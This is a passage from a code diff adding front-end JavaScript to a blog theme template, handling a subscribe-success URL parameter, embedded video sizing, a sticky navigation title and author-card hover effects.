+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // Give the parameter a variable name
+        var action = getParameterByName('action');
+
+        $(document).ready(function () {
+            if (action == 'subscribe') {
+                $('body').addClass("subscribe-success");
+            }
+
+            $('.subscribe-success-message .subscribe-close').click(function () {
+                $('.subscribe-success-message').addClass('close');
+            });
+
+            // Reset form on opening subscrion overlay
+            $('.subscribe-button').click(function() {
+                $('.subscribe-overlay form').removeClass();
+                $('.subscribe-email').val('');
+            });
+        });
+    </script>
+
+    <script>
+    $(document).ready(function () {
+        // FitVids - start
+        var $postContent = $(".post-full-content");
+        $postContent.fitVids();
+        // FitVids - end
+
+        // Replace nav with title on scroll - start
+        Casper.stickyNavTitle({
+            navSelector: '.site-nav-main',
+            titleSelector: '.post-full-title',
+            activeClass: 'nav-post-title-active'
+        });
+        // Replace nav with title on scroll - end
+
+        // Hover on avatar
+        var hoverTimeout;
+        $('.author-list-item').hover(function () {
+            var $this = $(this);
+
+            clearTimeout(hoverTimeout);
+
+            $('.author-card').removeClass('hovered');
+            $(this).children('.author-card').addClass('hovered');
+
+        }, function () {
+            var $this = $(this);
+
+            hoverTimeout = setTimeout(function () {
+                $this.children('.author-card').removeClass('hovered');
+            }, 800);
+        });
+    });
+</script>
+
+
+    
+
+</body>
